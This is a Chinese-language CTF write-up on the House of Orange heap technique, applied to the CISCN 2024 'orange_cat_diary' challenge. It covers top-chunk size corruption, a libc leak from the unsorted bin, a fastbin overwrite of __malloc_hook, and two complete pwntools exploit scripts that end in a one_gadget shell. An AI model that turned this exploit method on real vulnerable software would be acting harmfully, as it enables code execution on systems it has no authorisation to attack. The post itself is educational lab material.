---
title: House of Orange
date: '2025-02-27 17:27:43'
updated: '2025-04-07 21:39:55'
---
House of Orange 与其他的 House of XX 利用方法不同，这种利用方法来自于 Hitcon CTF 2016 中的一道同名题目。由于这种利用方法在此前的 CTF 题目中没有出现过，因此之后出现的一系列衍生题目的利用方法我们称之为 House of Orange。

House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中<font style="background-color:#FBDE28;">无法使用 free 函数</font>，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。

## [利用过程](https://www.cnblogs.com/ZIKH26/articles/16712469.html)
1、先利用溢出等方式进行篡改当前 topchunk 的 size

![](/images/6325b9ea781f026e97d948765b9fd0ec.png)

2、然后申请一个大于伪造的 topchunk 的 size 的 chunk

![](/images/ac09295b6e2b424184e9a34561635334.png)

## 伪造的 topchunk size 的要求
1. 伪造的 size 必须要对齐到内存页 （可以直接取十六进制下 topchunk 的低三位）
2. size 要大于 MINSIZE (0x10)
3. size 要小于之后申请的 chunk size + MINSIZE(0x10)
4. size 的 prev inuse 位必须为 1

之后原有的 top chunk 就会执行 _int_free 从而顺利进入 unsorted bin 中

## CISCN 2024 orange_cat_diary
![](/images/ffb54bf287c81af38bec330793a0ea41.png)

整理了一下伪代码，这样方便一点，接着看一下 4 个函数具体干了什么：

1. 选项 1：

```c
__int64 addedit()
{
    int v1; // [rsp+4h] [rbp-Ch]

    printf("Please input the length of the diary content:");
    v1 = readnumber();
    if ( (unsigned int)v1 > 0x1000 )
    {
        puts("The diary content exceeds the maximum length allowed.");
        exit(1);
    }
    ptr = malloc(v1);
    if ( !ptr )
    {
        puts("Memory allocation failed.");
        exit(1);
    }
    LODWORD(qword_202058) = v1;
    puts("Please enter the diary content:");
    read(0, ptr, (int)qword_202058);
    puts("Diary addition successful.");
    return 0LL;
}
```

输入 diary 的长度，不能超过 0x1000，然后按照长度申请出内存 ptr，再用 read 向 ptr 里面传入读取的数据

可以多次 malloc，但是不能够通过 ptr 获取到之前的 chunk 的指针，跟之前的题目用 ptr 数组存指针不一样，每一次申请之后指针都被替换了

2. 选项 2：

```c
__int64 fwriteptr()
{
    if ( dword_202014 > 0 )
    {
        fwrite(ptr, 1uLL, qword_202058, stdout);
        --dword_202014;
    }
    puts("Diary view successful.");
    return 0LL;
}
```

由于这个`dword_202014`是在 data 段并且初始就是 1，所以`fwrite`只能执行一遍

3. 选项 3：

```c
__int64 freeptr()
{
    if ( dword_202010 > 0 )
    {
        free(ptr);
        --dword_202010;
    }
    puts("Diary deletion successful.");
    return 0LL;
}
```

这里的`dword_202010`也是在 data 段初始为 1，所以`free`也只能执行一遍

4. 选项 4：

```c
__int64 editptr()
{
    int v1; // [rsp+4h] [rbp-Ch]

    printf("Please input the length of the diary content:");
    v1 = readnumber();
    if ( qword_202058 + 8 < (unsigned int)v1 )
    {
        puts("The diary content exceeds the maximum length allowed.");
        exit(1);
    }
    puts("Please enter the diary content:");
    read(0, ptr, v1);
    puts("Diary modification successful.");
    return 0LL;
}
```

可以编辑申请的 chunk 里面的数据，而且可以编辑的长度比 chunk 本身长度大了 8 个字节，重复次数不受限制



可以编辑多 8 个字节就可以覆盖到下一个 chunk 的 size 域，可以篡改下一个 chunk 的 size 和低三位的标志位

了解了一下 House of orange 的具体过程，可以利用 House of orange 来利用 unsortedchunk 泄露 libc 地址

### chunksize 思考点
如果申请的内存是 0x10 的倍数，例如 0x20，这时候是没有办法覆盖 topchunk 的 size 的，这是为什么？

![](/images/c8fe340ada7146bac5027bce86a7e55c.png)

![](/images/232ca73f1e94fabcde7b1fdc1c1a0e4a.png)

答：因为此时申请的内存和实际可以使用的内存不一样，此时实际可以使用的内存要大 8 个字节

申请的内存是 0x10 的倍数，再加上 prev_size 复用，

而 chunk 的地址得对齐 0x10，所以实际可用的内存会大 8 字节

而这题是按照申请时的长度+8 为读取的最长长度，如果申请的是 0x10 倍数的内存，

本来可以用的内存就多了 8 个字节（prev_size），所以没有办法覆盖到下一个 chunk 的 size



在覆盖完 topchunk 的 size ，申请比伪造的 topchunk 的 size 更大的 chunk 之后，

要在动调算一下<font style="background-color:#FBDE28;">这个时候</font> topchunk 的 fd 或者 bk 与 malloc_hook 的偏移，

用来后面利用泄露出的 libc 地址算出 malloc_hook 的地址

![](/images/7bb85e98287386ddf0af32b3728e6384.png)

![](/images/226910bae3aacf63b1ddb0c7e1d8b919.png)

结果，遇到了之前 pwn 小会的时候 xswlhhh 师傅和 lbq 学长提到的那个动调地址偏移不一样的问题了，

在下面框住这一句执行之后，已经被 free 掉进 unsortedbin 的 old_topchunk 在再次申请之后

里面的 fd 和 bk 居然变大了，偏移变成了 0x610，这导致泄露出来的并不是原来的 fd 和 bk

![](/images/e42dd7804424dd443cb5e7c58da4ad09.png)

而在执行这一句之前的 fd 和 bk 低几位都是正确的，可以算出来 malloc_hook 的地址

![](/images/49a25d416e765692995960492e75e707.png)

总之偏移是固定的，可以动调看完直接套，就可以在真正运行的时候算出来真正的 malloc_hook 的地址



得到了 malloc_hook 的地址，接下来就是要申请到这片内存，因为 fastbin 在申请时会检查 size，

可以通过字节错位在 malloc_hook 地址之前异构一个 fastchunk 从而覆盖到 malloc_hook

用 pwngdb 的 find_fake_fast 来找

![](/images/c7f801026b07d65f03941b3be3627e95.png)

结果遇到了 malloc 报错...

![](/images/9e3e1ed74241a9f647d71836e5da2fbe.png)

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
link=process("./ocd")
libc=ELF('./glibc/2.23-0ubuntu11.3_amd64/libc-2.23.so')

def gdb_attach():
	gdb.attach(link,"set solib-search-path /home/pwner/FocusingCTF/glibc/2.23-0ubuntu11.3_amd64/")
	pause()

def addedit(length,content):
	...

def fwriteptr():
	...

def freeptr():
	...

def editptr(length,content):
	...

link.recvuntil(b'name.')
link.send(b'garhin')

payload=b'a'*0x28+p64(0xfd1)
addedit(0x28,b'a')
editptr(0x30,payload)
addedit(0xfdf,b'a')

# gdb_attach()

addedit(0x70,b'a')
fwriteptr()

libc_addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))+0x27
print(hex(libc_addr))
malloc_hook=libc_addr-0x678
print(hex(malloc_hook))
libc_base=malloc_hook-libc.sym[b'__malloc_hook']
print(hex(libc_base))

freeptr()
editptr(0x8,p64(malloc_hook-0x23))

# gdb_attach()

ogg=[0x4527a,0xf03a4,0xf1247]
addedit(0x70,p64(0))

payload=b'a'*0x13+p64(libc_base+ogg[1])
addedit(0x70,payload)
addedit(0x70,p64(0))

link.interactive()
```

### malloc 重点
在 clby 师傅讲解之后，有一个点是我忘记了的，size 域存着的 size 并不是用户数据的大小，而是包括 prev_size 和 size 域的整个 chunk 的大小（<font style="background-color:#FBDE28;">不包括下一个 chunk 的 prev_size 域</font>）

这里 malloc 申请的是 0x70 大小的，所以实际申请到的是 0x80 大小的 chunk

而伪造的 fakefastchunk 的 size 是 0x7f，实际用户内存应该是 0x60（加上下一个 chunk 的 prev_size 的话就 0x68）

所以应该是申请 0x59-0x68（注意 chunk 对齐 0x10，0x61-0x68 是下一个 chunk的 prev_size 域）大小的内存才可以申请出来这个 fakefastchunk

最终 exp：

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
link=process("./ocd")
libc=ELF('./glibc/2.23-0ubuntu11.3_amd64/libc-2.23.so')

def gdb_attach():
	gdb.attach(link,"set solib-search-path /home/pwner/FocusingCTF/glibc/2.23-0ubuntu11.3_amd64/")
	pause()

def addedit(length,content):
	link.recvuntil(b'choice:')
	link.sendline(b'1')
	link.recvuntil(b'content:')
	link.send(str(length))
	link.recvuntil(b'content:')
	link.send(content)

def fwriteptr():
	link.recvuntil(b'choice:')
	link.sendline(b'2')

def freeptr():
	link.recvuntil(b'choice:')
	link.sendline(b'3')

def editptr(length,content):
	link.recvuntil(b'choice:')
	link.sendline(b'4')
	link.recvuntil(b"content:")
	link.send(str(length))
	link.recvuntil(b"content:")
	link.send(content)

link.recvuntil(b'name.')
link.send(b'garhin')

payload=b'a'*0x28+p64(0xfd1)
addedit(0x28,b'a')
editptr(0x30,payload)
addedit(0xfdf,b'a')

# gdb_attach()

addedit(0x60,b'a')
fwriteptr()

libc_addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))+0x27
print(hex(libc_addr))
malloc_hook=libc_addr-0x678
print(hex(malloc_hook))
libc_base=malloc_hook-libc.sym[b'__malloc_hook']
print(hex(libc_base))

# addedit(0x60,b'a')
freeptr()
editptr(0x8,p64(malloc_hook-0x23))
# gdb_attach()
ogg=[0x4527a,0xf03a4,0xf1247]
addedit(0x60,p64(0))

payload=b'a'*0x13+p64(libc_base+ogg[1])
addedit(0x59,payload)

link.recvuntil(b'choice:')
link.sendline(b'1')
link.recvuntil(b'content:')
link.send(b'1')

link.interactive()
```

细节：最后调用 malloc 时不能接着用脚本前面定义的 addedit 函数，因为一 malloc 就执行 one_gadget 了，不会有后面的回显，用 addedit 来调用 malloc 会卡在 recvuntil 不动

